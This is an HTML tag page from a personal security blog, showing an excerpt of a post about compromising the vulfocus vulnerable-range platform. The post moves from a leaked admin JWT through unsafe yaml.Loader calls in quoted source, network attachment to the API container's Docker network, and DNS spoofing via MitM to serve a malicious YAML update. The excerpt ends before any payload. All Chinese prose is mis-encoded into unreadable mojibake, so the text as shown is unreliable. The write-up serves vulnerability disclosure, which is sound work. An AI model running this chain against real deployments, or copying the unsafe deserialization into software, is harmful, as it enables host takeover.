<!doctype html>
<html lang="zh"><head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "nq90i0uzl9");
    </script>
    <!-- Microsoft Clarity ends-->
    <!-- Google tag (gtag.js) begins-->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'AW-16453505124');
    </script>
    <!-- Google tag (gtag.js) ends-->
    <!-- hexo injector head_begin end --><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>æ¨™ç±¤: misc - TriangeSnake&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="TriangeSnake&#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="TriangeSnake&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="TriangeSnake&#039;s Blog"><meta property="og:url" content="https://trianglesnake.com/"><meta property="og:site_name" content="TriangeSnake&#039;s Blog"><meta property="og:locale" content="zh_TW"><meta property="og:image" content="https://trianglesnake.com/img/og_image.png"><meta property="article:author" content="TriangleSnake"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://trianglesnake.com/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://trianglesnake.com"},"headline":"TriangeSnake's Blog","image":["https://trianglesnake.com/img/og_image.png"],"author":{"@type":"Person","name":"TriangleSnake"},"publisher":{"@type":"Organization","name":"TriangeSnake's Blog","logo":{"@type":"ImageObject","url":"https://trianglesnake.com/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="TriangeSnake&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/trianglesnake"><i class="fab fa-github"></i></a><a class="navbar-item search" title="æœå°‹" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">æ¨™ç±¤</a></li><li class="is-active"><a href="#" aria-current="page">misc</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-06-22T07:21:56.000Z" title="2025/6/22 ä¸‹åˆ3:21:56">2025-06-22</time>ç™¼è¡¨</span><span class="level-item"><time dateTime="2025-07-24T10:37:54.778Z" title="2025/7/24 ä¸‹åˆ6:37:54">2025-07-24</time>æ›´æ–°</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a></span><span class="level-item">12 åˆ†é˜è®€å®Œ (å¤§ç´„1823å€‹å­—)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/">å«ä½ æ‰“é¶æ©Ÿå¹³å°ä¸æ˜¯å«ä½ æŠŠæ•´å€‹å¹³å°æ‰“ä¸‹ä¾†ï¼Œè¨˜éŒ„é‡å° vulfocus çš„ä¸€æ¬¡æ»²é€</a></p><div class="content"><p>æœ€è¿‘æ¥è§¸åˆ°ä¸€å€‹å°å²¸çš„é–‹æºé¶æ©Ÿå¹³å° <a target="_blank" rel="noopener" href="https://github.com/fofapro/vulfocus">vulfocus</a> ï¼Œ <code>vulfocus</code> æ•´åˆäº† <code>docker</code> ã€ <code>docker compose</code> ï¼Œè®“æ¶è¨­è€…èƒ½å¤ ä¸€éµéƒ¨ç½²æ¼æ´é¡Œç›®ï¼Œä¸¦ä¸”åœ¨ container ä¸­è‡ªå¸¶ Flag ã€‚</p>
<p>äº‹æƒ…çš„é–‹ç«¯æ˜¯æˆ‘åœ¨é€™å€‹å°ˆæ¡ˆçš„ <a target="_blank" rel="noopener" href="https://github.com/fofapro/vulfocus/issues/354">issue</a> ä¸­çœ‹åˆ°äº†ä¸€å€‹ <code>JWT token</code> leakï¼Œä¸¦ä¸”å¯ä»¥æ‹¿åˆ° <code>admin</code> çš„æ¬Šé™ï¼Œæ¬¸æ—¢ç„¶æ‹¿åˆ° <code>admin</code> æ¬Šé™äº†åˆæ˜¯é¶æ©Ÿå¹³å°ï¼Œç”šè‡³å¯ä»¥è‡ªè¨‚ <code>docker-compose.yml</code> ï¼Œæ‡‰è©²å¯ä»¥é¦¬ä¸Š RCE å§ï¼Ÿæˆ‘ä¸€é–‹å§‹æ˜¯é€™æ¨£æƒ³çš„ï¼Œä½†çµæœæ¯”æˆ‘æƒ³åƒçš„é‚„è¦è¤‡é›œå¾ˆå¤šã€‚</p>
<h2 id="æœ‰-docker-compose-ç‚ºä»€éº¼é‚„æ˜¯æ²’è¾¦æ³•-RCE-å‘¢"><a href="#æœ‰-docker-compose-ç‚ºä»€éº¼é‚„æ˜¯æ²’è¾¦æ³•-RCE-å‘¢" class="headerlink" title="æœ‰ docker compose ç‚ºä»€éº¼é‚„æ˜¯æ²’è¾¦æ³• RCE å‘¢"></a>æœ‰ docker compose ç‚ºä»€éº¼é‚„æ˜¯æ²’è¾¦æ³• RCE å‘¢</h2><p>å°å…¥é¶æ©Ÿä»‹é¢æä¾›äº†ä¸‰ç¨®å°å…¥æ–¹å¼</p>
<ol>
<li>æ·»åŠ </li>
<li>æœ¬åœ°å°å…¥</li>
<li>Compose ç·¨è­¯</li>
</ol>
<p>æ·»åŠ åŠŸèƒ½å¯ä»¥è®“ä½ ä¸Šå‚³æˆ–æ˜¯æä¾›ç¶²å€ pull image é€²ä¾†ï¼Œæœ¬åœ°å°å…¥è®“ç®¡ç†è€…å¯ä»¥ç›´æ¥é€éæœ¬æ©Ÿè£¡é¢å·²ç¶“æœ‰çš„ image ä¸€éµå»ºç«‹æ¼æ´é¡Œç›®ï¼Œè€Œ Compose ç·¨è­¯å‰‡èƒ½è‡ªå·±æ’°å¯«é¶æ©Ÿçš„ <code>docker-compose.yml</code></p>
<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/1.png"></p>
<p>æ—¢ç„¶é¶æ©Ÿæ˜¯ <code>docker</code> ç®¡ç†çš„ï¼Œä¸å…è®“äººé¦¬ä¸Šè¯æƒ³åˆ° docker escape ã€‚æˆ‘éƒ½æœ‰ <code>docker-compose.yml</code> äº†ç›´æ¥å¯«ä¸€å€‹ <code>privileged: true</code> ä¸å°±å®Œäº‹äº†ã€‚</p>
<p>æ­å–œï¼Œ <code>docker compose</code> çš„åŠŸèƒ½æ ¹æœ¬å°±æ˜¯å£çš„ï¼Œå› ç‚ºä»–æŠŠ yaml parse ä¹‹å¾Œç›´æ¥å¡é€²å» <code>json.load</code> ï¼Œä½†æ˜¯ <code>json.loads</code> åªèƒ½å¡å­—ä¸²</p>
<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/2.png"></p>
<h2 id="Vulfocus-API-çš„æ¶æ§‹"><a href="#Vulfocus-API-çš„æ¶æ§‹" class="headerlink" title="Vulfocus API çš„æ¶æ§‹"></a>Vulfocus API çš„æ¶æ§‹</h2><p>åœ¨äº‚ç¿»åŠŸèƒ½æ™‚ï¼Œæˆ‘ç™¼ç¾ã€Œæœ¬åœ°å°å…¥ã€é é¢æœ‰ä¸€å€‹ <code>vulfocus-api</code> çš„ container<br><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/4.png"></p>
<p>æ­£å¸¸ä¾†è¬›é€™ç¨®é¶æ©Ÿå¹³å°æ‡‰è©²æ˜¯åŒ…å…©å±¤ docker é¿å… challenge å½±éŸ¿åˆ°å…¶ä»–çš„ Containerï¼Œä¸éçœ‹äº†ä¸€ä¸‹ source code ç™¼ç¾å…¨éƒ¨çš„ challenge container éƒ½æ˜¯é€é host çš„ docker api ç›´æ¥æ–°å¢ï¼Œä¹Ÿå°±æ˜¯èªªé€™äº› challenge è¢«æ•£è½åœ¨å®¿ä¸»æ©Ÿä¸Šï¼Œåƒ…é€é network éš”é›¢ã€‚</p>
<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/3.png"></p>
<p>æ—¢ç„¶ <code>vulfocus-api</code> æ˜¯ä¸€å€‹ container ä¸¦ä¸”å¯ä»¥æ“ä½œ host çš„ dockerï¼Œé‚£æˆ‘å€‘æœ‰æ²’æœ‰è¾¦æ³•é€éã€Œæœ¬åœ°å°å…¥ã€æŠŠé€™å€‹ container åŠ é€²ä¾†ï¼Œé€™æ¨£æˆ‘ä¸å°±æœ‰å®¿ä¸»æ©Ÿçš„ <code>docker.sock</code> äº†å—ï¼Ÿ</p>
<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/5.png"></p>
<p>æ­å–œï¼Œåˆä¸èƒ½ï¼Œå› ç‚ºã€Œæœ¬åœ°å°å…¥ã€åªæœƒè¤‡è£½ container çš„ image å’Œ <code>docker-comopse.yml</code> çš„ expose portï¼Œå…¶ä»–æ¬„ä½éƒ½æœƒè¢«ä¸Ÿæ‰ï¼ŒåŒ…æ‹¬è¢«æ›é€²ä¾†çš„ <code>docker.sock</code></p>
<h2 id="YAML-ååºåˆ—åŒ–æ¼æ´"><a href="#YAML-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="YAML ååºåˆ—åŒ–æ¼æ´"></a>YAML ååºåˆ—åŒ–æ¼æ´</h2><p>api ä¸­æœ‰è¨±å¤šåœ°æ–¹ç”¨åˆ°äº† <code>yaml</code> ä¾†å„²å­˜å’Œè¼‰å…¥è³‡æ–™ï¼Œè€Œæœ‰äº›åœ°æ–¹ç”¨äº†ä¸å®‰å…¨çš„ yaml.Loaderï¼Œé›–ç„¶å¦‚æ­¤ä½†é€™äº› <code>yaml.Loader</code> çš„å…§å®¹éƒ½æ˜¯æˆ‘å€‘ï¼ˆç†è«–ä¸Šï¼‰ç„¡æ³•ç›´æ¥æ§åˆ¶çš„ï¼Œæœ‰çš„æ˜¯é€é yaml.dump å¾Œ load é€²ä¾†ï¼Œæœ‰çš„æ˜¯é€éå®˜ç¶²ä¸‹è¼‰å®˜æ–¹ç·¨æ’å ´æ™¯ load é€²ä¾†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">raw_data = yaml.dump(req)</span><br><span class="line">raw_data = yaml.load(raw_data, Loader=yaml.Loader)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://vulfocus.io/api/layoutinfodet?layout_id=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line">res = requests.get(url, verify=<span class="literal">False</span>).content</span><br><span class="line">req = json.loads(res)</span><br><span class="line">raw_data = req[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;layout_raw_content&#x27;</span>]</span><br><span class="line">raw_data = yaml.load(raw_data, Loader=yaml.Loader)</span><br></pre></td></tr></table></figure>

<p>é‚£ç‚ºä»€éº¼æ˜¯ã€Œç†è«–ä¸Šã€å‘¢ï¼Ÿ<del>å› ç‚ºæˆ‘åªè¦æŠŠä»–å€‘çš„å®˜ç¶²æ‰“ä¸‹ä¾†å°±è®Šæˆå¯æ§çš„äº†</del><br>ç•¶ç„¶ä¸æ˜¯ï¼Œä½œç‚ºå¥½é§­å®¢ï¼ˆçš„æœ‹å‹ï¼‰æˆ‘å€‘ä¸èƒ½åœ¨æœªç¶“æˆæ¬Šçš„æƒ…æ³ä¸‹æ”»æ“Šåˆ¥äººçš„ç¶²ç«™ï¼Œå› æ­¤æˆ‘å€‘å°‡é€²åˆ°æœ¬æ–‡çš„é‡é»ï¼šå¦‚ä½•åœ¨ä¸æ‰“ä¸‹å®˜ç¶²çš„ç‹€æ³ä¸‹æ§åˆ¶ <code>raw_data</code></p>
<p>é¡Œå¤–è©±ï¼šç›®å‰ <a target="_blank" rel="noopener" href="https://vulfocus.io/">vulfocus.io</a> é€™å€‹ domain å·²ç¶“è¢«è¶Šå—çš„å£é§­å®¢æ‰“ä¸‹ä¾†äº†<br><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/6.png"></p>
<h2 id="MitM-YAML-Deserialization-Docker-Escape"><a href="#MitM-YAML-Deserialization-Docker-Escape" class="headerlink" title="MitM + YAML Deserialization + Docker Escape"></a>MitM + YAML Deserialization + Docker Escape</h2><h3 id="Vulfocus-çš„å ´æ™¯åŠŸèƒ½"><a href="#Vulfocus-çš„å ´æ™¯åŠŸèƒ½" class="headerlink" title="Vulfocus çš„å ´æ™¯åŠŸèƒ½"></a>Vulfocus çš„å ´æ™¯åŠŸèƒ½</h3><p>åœ¨é–‹å§‹ä¹‹å‰ï¼Œæˆ‘å€‘éœ€è¦ä»‹ç´¹å¦ä¸€å€‹ Vulfocus framework çš„ feature â€”â€” å ´æ™¯åŠŸèƒ½</p>
<p>ç°¡è€Œè¨€ä¹‹ï¼Œå ´æ™¯åŠŸèƒ½å¯ä»¥å°‡å¤šå€‹ container å’Œç¶²è·¯ç’°å¢ƒæ•´åˆæˆä¸€å€‹é¡Œç›®ï¼Œå‰é¢æåˆ° challenge ç”±ä¸åŒç¶²å¡å°‡å½¼æ­¤åšéš”é›¢ï¼Œè€Œ layout åŠŸèƒ½å‰‡æ˜¯å°‡å¤šå€‹ container æ”¾åœ¨åŒä¸€å€‹ç¶²è·¯ç’°å¢ƒï¼Œè®“å½¼æ­¤å¯ä»¥äº’é€šï¼Œå› æ­¤å‡ºé¡Œè€…å¯ä»¥æ§‹å»ºæ¯”å¦‚ SSRFã€é¡Œç›®å†åŠ ä¸€å±¤ WAF ä¹‹é¡çš„å ´æ™¯ã€‚</p>
<h3 id="äº‚æç¶²å¡"><a href="#äº‚æç¶²å¡" class="headerlink" title="äº‚æç¶²å¡"></a>äº‚æç¶²å¡</h3><p>æ—¢ç„¶å¯ä»¥äº‚æç¶²è·¯ç’°å¢ƒï¼Œé‚£æˆ‘å€‘æœ‰æ²’æœ‰å¯èƒ½å°‡æŸå€‹ container æ›åˆ°å’Œ <code>vulfocus-api</code> çš„ç›¸åŒç‰©ç†ç¶²è·¯ä¹‹ä¸­å‘¢ï¼Ÿ<br>åœ¨æ–°å¢ç¶²å¡çš„é é¢ä¸­ï¼Œé›–ç„¶ vulfocus æœ¬èº«æ²’æœ‰å°æ–°å¢çš„ç¶²å¡åšä»»ä½•é™åˆ¶ï¼Œä½†æ˜¯é€™äº›è³‡æ–™åˆ°äº† docker api å°±æœƒçˆ†ç‚¸ï¼Œå› ç‚ºæ²’è¾¦æ³•æ–°å¢ç›¸åŒåç¨±æˆ–å­ç¶²é‡ç–Šçš„ network</p>
<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/7.png"><br><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/8.png"></p>
<p>åœ¨ä¸€ç•ªå˜—è©¦å¾Œï¼Œæ–°å¢å ´æ™¯çš„ç¶²å¡é‚è¼¯å¼•èµ·äº†æˆ‘çš„æ³¨æ„ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#run_layout</span></span><br><span class="line"><span class="comment"># å¯åŠ¨ç½‘å¡</span></span><br><span class="line">raw_con = json.loads(layout_info.raw_content)</span><br><span class="line">network_list = client.networks.<span class="built_in">list</span>()</span><br><span class="line">net_list = []</span><br><span class="line">network_names = [item[<span class="string">&#x27;attrs&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] <span class="keyword">for</span> item <span class="keyword">in</span> raw_con[<span class="string">&#x27;nodes&#x27;</span>] <span class="keyword">if</span> item[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&quot;Network&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> network_list:</span><br><span class="line">    net_list.append(i.attrs[<span class="string">&#x27;Name&#x27;</span>])</span><br><span class="line"><span class="keyword">for</span> network_name <span class="keyword">in</span> network_names:</span><br><span class="line">    <span class="keyword">if</span> network_name <span class="keyword">in</span> net_list:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#å¾å„²å­˜çš„ç¶²å¡ä¸­æ‰¾å‡ºè©²å ´æ™¯çš„ç¶²å¡</span></span><br><span class="line">            network_det = NetWorkInfo.objects.<span class="built_in">filter</span>(net_work_name=network_name).first()</span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;å…¶ä»–è¨­å®š...ä»¥ä¸‹çœç•¥&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(R.build(msg=<span class="built_in">str</span>(e)))</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯èªªï¼Œç¨‹å¼æœƒå…ˆçœ‹ docker network è£¡é¢æœ‰æ²’æœ‰è©²å ´æ™¯çš„ç¶²å¡åç¨±ï¼Œå¦‚æœæœ‰å°±æœƒç”¨å®ƒæŠŠ container è·‘èµ·ä¾†ï¼Œæ²’æœ‰çš„è©±æ‰æœƒå» NetWorkInfo ä¸­æ‰¾å„²å­˜çš„ç¶²å¡ï¼Œæ‰€ä»¥ï¼Œæˆ‘å€‘å¯ä»¥åœ¨æ–°å¢å ´æ™¯æ™‚ï¼Œç›´æ¥è¨­å®šä¸å­˜åœ¨æ–¼ vulfocus ä½†å­˜åœ¨æ–¼ docker ä¸­çš„ networkï¼Œä¹Ÿå°±æ˜¯ <code>vulfocus-api</code> ä½¿ç”¨çš„ç¶²è·¯ç’°å¢ƒ <code>vulfocus_vulfocus</code></p>
<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/9.png"></p>
<p>è‡³æ–¼ç‚ºä»€éº¼æ˜¯ <code>vulfocus_vulfocus</code> å‘¢ï¼Ÿå› ç‚ºå®˜æ–¹æä¾›çš„ GitHub repo ä¸­ï¼Œ<code>docker-compose.yml</code> ä¾¿æ˜¯ <code>vulfocus</code> ï¼Œè€Œ docker network å‘½åçš„é‚è¼¯ç‚º <code>folderName_networkName</code> å› æ­¤å¦‚æœä½¿ç”¨å®˜æ–¹çš„ repo ï¼Œç¶²å¡åç¨±ä¾¿æœƒæ˜¯ <code>vulfocus_vulfocus</code></p>
<h3 id="MitM"><a href="#MitM" class="headerlink" title="MitM"></a>MitM</h3><p>åˆ°ç›®å‰ç‚ºæ­¢ï¼Œæˆ‘å€‘å·²ç¶“æˆåŠŸé€£æ¥åˆ° <code>vulfocus-api</code> çš„ç‰©ç†ç¶²è·¯ï¼Œå› æ­¤ï¼Œæˆ‘å€‘åªéœ€è¦å°ä»–åš MitM ï¼Œ<code>http://vulfocus.io</code> å›å‚³çš„çµæœä¾¿æ˜¯æˆ‘å€‘å¯æ§çš„äº†</p>
<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/10.png"></p>
<p>å°‡ vulfocus-api èˆ‡ gateway åšä¸­é–“äººæ”»æ“Šå¾Œï¼Œæˆ‘å€‘ä¾¿å¯ä»¥å·å·æ›æ‰ vulfocus.io çš„ dns çµæœ<br><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/12.png"></p>
<p><img src="/2025/06/22/%E5%8F%AB%E4%BD%A0%E6%89%93%E9%9D%B6%E6%A9%9F%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%98%AF%E5%8F%AB%E4%BD%A0%E6%8A%8A%E6%95%B4%E5%80%8B%E5%B9%B3%E5%8F%B0%E6%89%93%E4%B8%8B%E4%BE%86%EF%BC%81%E8%A8%98%E9%8C%84%E9%87%9D%E5%B0%8D-vulfocus-%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BB%B2%E9%80%8F/11.png"><br>è§¸ç™¼æ›´æ–°çš„ apiï¼Œæ­¤æ™‚ç¨‹å¼æŒ‰ç…§é å®šé‚è¼¯åˆ° vulfocus.io ä¸‹è¼‰æ›´æ–°ï¼Œä½†å› ç‚º dns æŸ¥è©¢çµæœå·²ç¶“è¢«æˆ‘å€‘ç¯¡æ”¹ï¼Œå› æ­¤æœƒä¸‹è¼‰åˆ°éŒ¯èª¤çš„ yaml </p>
